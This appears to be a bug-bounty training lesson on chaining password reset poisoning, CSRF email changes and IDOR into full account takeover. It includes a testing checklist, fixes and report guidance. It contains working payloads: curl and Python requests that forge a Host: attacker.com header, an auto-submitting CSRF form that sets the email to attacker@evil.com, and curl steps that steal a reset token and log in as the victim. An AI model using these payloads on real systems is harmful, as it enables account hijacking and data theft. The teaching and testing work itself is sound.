---
title: "Account Takeover Chains — Password Reset Poisoning, CSRF, IDOR → Full ATO"
tags: [ATO, account-takeover, password-reset, host-header-injection, CSRF, IDOR,
       chain-exploit, ATT&CK-T1110, ATT&CK-T1606, CWE-640, CWE-352]
module: 04-BroadSurface-01
day: 174
related_topics:
  - Password Reset Flaws (Day 46)
  - CSRF Fundamentals (Day 89)
  - IDOR Fundamentals (Day 101)
  - JWT Advanced Attacks (Day 169)
  - OAuth Abuse Deep Dive (Day 171)
  - SAML Attacks (Day 173)
---

# Day 174 — Account Takeover Chains

> "Account takeover is the crown jewel of web bug bounty. It is not one bug —
> it is a chain. Password reset leaks the token. CSRF uses it. IDOR reads the
> victim's data first. Each step by itself is Medium. Chain them and you have
> Critical. The attack tree is the skill."
>
> — Ghost

---

## Goals

By the end of this lesson you will be able to:

1. Build a password reset poisoning attack using host header injection that
   directs the reset link to an attacker-controlled server.
2. Chain a CSRF vulnerability on an email-change endpoint to take over an
   account without any token.
3. Chain an IDOR with a password reset flow to redirect the reset token to an
   attacker-controlled email.
4. Map an attack tree for full account takeover from an unauthenticated
   starting position.
5. Write a single combined finding report for a multi-step ATO chain.

---

## Prerequisites

| Requirement | Reference |
|---|---|
| Password reset fundamentals | Day 46 |
| CSRF | Day 89 |
| IDOR | Day 101 |
| Host header attacks | Day 136 |
| BOLA/BFLA | Day 148 |

---

## The ATO Attack Tree

```
Unauthenticated attacker
│
├── Branch A — Password Reset Poisoning
│   ├── Host header injection → reset link sent to attacker domain
│   ├── Dangling subdomain → reset email domain not owned by target
│   └── Token leakage → reset link in Referer/log
│
├── Branch B — CSRF-Based Account Modification
│   ├── Email change CSRF → change victim's email to attacker's
│   ├── Password change CSRF → change victim's password
│   └── MFA disable CSRF → remove MFA from victim account
│
├── Branch C — IDOR / BOLA Chains
│   ├── IDOR on password reset → use victim's token as attacker
│   ├── BOLA on user profile → read victim's email/phone for targeted reset
│   └── IDOR on email change → change victim's email via IDOR
│
└── Branch D — Auth Protocol Abuse
    ├── JWT forgery → forge admin token (Day 169–170)
    ├── OAuth code theft → steal victim's OAuth token (Day 171–172)
    └── SAML XSW → forge SAML assertion (Day 173)
```

---

## Chain 1 — Password Reset Poisoning via Host Header

### How it works

When a user requests a password reset, the server generates a token and builds
a reset URL: `https://{HOST}/reset?token=XYZ`. The host value is taken from
the `Host` (or `X-Forwarded-Host`) header — which the attacker controls.

**Step-by-step:**

```bash
# 1. Attacker initiates a password reset for the victim's account
curl -s -X POST https://target.com/forgot-password \
  -H "Host: attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "email=victim@company.com"

# Result: server sends reset email with:
# https://attacker.com/reset?token=RESET_TOKEN
# Victim clicks it → Referer: https://target.com → reset token in server logs
```

**Verification step:** check whether the email sent to the victim contains
your attacker domain in the reset URL. Use a test account you control first.

```python
import requests

# Test with your own email first
r = requests.post(
    "https://target.com/forgot-password",
    headers={
        "Host": "attacker.com",
        "X-Forwarded-Host": "attacker.com",   # Try both headers
    },
    data={"email": "YOUR_TEST_EMAIL@example.com"},
)
print(r.status_code, r.text)

# Check your email — does the reset link say https://attacker.com/... ?
# If yes → host header injection confirmed
```

**Real-world case:** Portswigger Research (2017) documented this in Laravel,
Django, and several commercial apps. The root cause is using `$_SERVER['HTTP_HOST']`
in reset URL construction without a configured base URL.

**CVSS:** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` → 8.8 (High)
(User interaction: victim must click the reset link)

**Fix:**

```python
# Bad: use request's Host header
reset_url = f"https://{request.headers['Host']}/reset?token={token}"

# Good: use configured base URL from server config, never from request headers
from flask import current_app
BASE_URL = current_app.config["BASE_URL"]  # = "https://target.com"
reset_url = f"{BASE_URL}/reset?token={token}"
```

---

## Chain 2 — CSRF → Email Change → Account Takeover

### Scenario

The email-change endpoint (`POST /api/v1/account/email`) is CSRF-vulnerable:
no CSRF token, no SameSite cookie, no origin check. An attacker tricks a
logged-in victim into submitting a form that changes their email to the
attacker's address. The attacker then initiates a normal password reset for
the victim's account — which now sends the reset link to the attacker's inbox.

### Attack

```html
<!-- Attacker's page — victim must be logged into target.com -->
<!DOCTYPE html>
<html>
<body onload="document.getElementById('f').submit()">
<form id="f" action="https://target.com/api/v1/account/email"
      method="POST" style="display:none">
  <input name="new_email" value="attacker@evil.com">
</form>
</body>
</html>
```

Host this page. Send the URL to the victim (phishing, stored XSS on a
lower-privilege page, social media link, etc.).

**When the victim's browser loads the page:**
1. Form auto-submits with the victim's session cookie
2. Target server accepts the request (no CSRF protection)
3. Victim's account email changes to `attacker@evil.com`

**Step 2:** attacker requests a password reset for the victim's *original*
username or account ID:

```bash
curl -X POST https://target.com/forgot-password \
  -d "username=victim_username"
# Reset link sent to attacker@evil.com → attacker resets victim's password
```

**Full chain:** CSRF email change → password reset → full account takeover.

**CVSS:** `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N` → 8.8 (High)

---

## Chain 3 — IDOR → Password Reset Token Theft

### Scenario

The password reset endpoint at `POST /api/v1/reset/initiate` accepts a
`user_id` parameter instead of an email address. The reset token is returned
in the API response without being sent by email — relying on the caller being
authenticated.

But the endpoint has no authentication required.

```bash
# Step 1: BOLA — find victim's user ID via BOLA on profile endpoint
VICTIM_ID=$(curl -s https://target.com/api/v1/users?email=alice@company.com \
  -H "Authorization: Bearer $MY_TOKEN" | jq -r '.[0].id')

# Step 2: IDOR — initiate reset for victim's user_id without authentication
curl -s -X POST https://target.com/api/v1/reset/initiate \
  -H "Content-Type: application/json" \
  -d "{\"user_id\": ${VICTIM_ID}}"
# → {"reset_token": "VICTIM_RESET_TOKEN_abc123"}

# Step 3: Use token to reset victim's password
curl -s -X POST https://target.com/api/v1/reset/complete \
  -d "token=VICTIM_RESET_TOKEN_abc123&new_password=Attacker1!"
# → {"message": "Password reset successfully"}

# Step 4: Login as victim
curl -s -X POST https://target.com/api/v1/auth/login \
  -d "email=alice@company.com&password=Attacker1!"
# → Authenticated
```

**CVSS:** `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` → 9.9 (Critical)

---

## Chain 4 — JWT Forgery → Admin Takeover (Reference)

Covered in Day 170. The chain:

```
kid path traversal → forge admin JWT → access admin /exec endpoint → RCE
```

In an ATO context: forge a JWT for a specific victim account by setting
`sub: victim@company.com` instead of `admin`.

---

## Chain 5 — Full Attack Tree: Unauthenticated → Full Admin Access

Combining chains 1 and 3 for the highest-impact scenario:

```
Starting position: unauthenticated attacker

Step 1 — OSINT: enumerate alice@company.com as an admin from LinkedIn
Step 2 — BOLA: discover alice's user_id = 1 (no auth needed via unauthenticated
         endpoint: GET /api/v1/users?email=alice@company.com)
Step 3 — IDOR: POST /api/v1/reset/initiate {"user_id": 1}
         → Reset token returned in response (no email required)
Step 4 — Reset alice's password
Step 5 — Login as alice → admin access
Step 6 — Read all user data, configuration, internal endpoints
```

**Total CVSS:** 9.9 (Critical)
**Prerequisite:** zero — unauthenticated, no social engineering, no victim
interaction.

---

## Building Your ATO Test Methodology

For any target, work through this checklist:

### Password Reset Testing

```
[ ] Does the reset URL include the Host header value?
    Test: send request with Host: attacker.com
[ ] Is the reset token predictable?
    Test: request 10 tokens; compare for patterns
[ ] Is the reset token single-use?
    Test: use a token; request the same link again
[ ] Does the token expire?
    Test: wait 24 hours; try the token
[ ] Does the reset link go to the email associated with the account,
    or to an attacker-supplied email parameter?
    Test: add email= parameter to reset request body
[ ] Are reset tokens visible in URL (Referer leakage)?
    Check: is the token in the URL path or query string?
```

### Email/Account Change Testing

```
[ ] Is the email-change endpoint CSRF-protected?
    Test: submit without CSRF token; check cookie SameSite policy
[ ] Does email change require current password confirmation?
[ ] Is the new email verified before the change takes effect?
[ ] Can the new email be changed to an email that is already registered
    as another account? (account merge/collision)
```

### Password Change Testing

```
[ ] Does password change require the current password?
[ ] Is the password change endpoint CSRF-protected?
[ ] Can the password be changed without knowing the current one via a
    race condition?
```

---

## Report Writing for ATO Chains

ATO chains need special attention in report format because the severity is
derived from the chain, not from any individual bug.

**Title:** `Full Account Takeover via CSRF Email Change + Password Reset
for any registered user`

**Severity:** Critical (CVSS 9.1)

**Executive summary paragraph:**

```
Three individually moderate vulnerabilities combine into a critical-severity
full account takeover chain. The email-change endpoint lacks CSRF protection.
The password reset endpoint does not verify the current password. An attacker
who tricks a logged-in user into visiting a malicious page can silently
change the victim's registered email address; they then trigger a standard
password reset which is delivered to the attacker's inbox. The full chain
requires no knowledge of the victim's current credentials and no elevated
privileges, and can be executed entirely from an unauthenticated position
once the victim visits the attacker's page.
```

List the individual findings as components with their standalone severity,
then present the chain with its combined severity and CVSS score.

---

## Key Takeaways

1. **Account takeover is always a chain.** Look for the combination:
   something that leaks or redirects a token + something that allows using
   that token to gain access. The two bugs together are worth 10× either
   individually.
2. **Password reset is the most fertile ATO surface.** Every application has
   it. Most developers test the happy path and nothing else.
3. **CSRF on account modification endpoints is still common** despite
   SameSite=Lax being a default in modern browsers. Test every
   email/password/phone change endpoint explicitly.
4. **Map the attack tree before exploiting.** A good attack tree finds the
   path of least resistance to the highest-severity outcome. Do not exploit
   the first bug you find — find all bugs first, then chain them.
5. **Combined CVSS always exceeds the individual scores.** A Medium CSRF
   (5.4) + Medium IDOR (6.5) = Critical ATO chain (9.1). The chain is the
   product; the components are the ingredients.

---

## Exercises

1. On the Day 168 credential lab, test whether the password reset endpoint is
   vulnerable to host header injection. (Add a password reset flow to the
   lab app as an exercise.)
2. Build a complete CSRF PoC for an email-change endpoint on a test Flask
   application you control. Demonstrate that visiting the PoC page as a
   logged-in user changes the registered email.
3. Draw the full attack tree for a target that has: password reset with email
   parameter injection, no CSRF on email change, and IDOR on user profile.
   Label each node with its standalone CVSS score and the combined score.
4. Write the full chain report for Chain 3 (IDOR → password reset token
   theft) using the Day 161 template. Include a Python script as the PoC.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q174.1, Q174.2 …).
> Follow-up questions use hierarchical numbering (Q174.1.1, Q174.1.2 …).

---

## Navigation

← Previous: [Day 173 — SAML Attacks](DAY-0173-SAML-Attacks.md)
→ Next: [Day 175 — Kerberoasting and Pass-the-Hash Intro](DAY-0175-Kerberoasting-and-Pass-the-Hash-Intro.md)
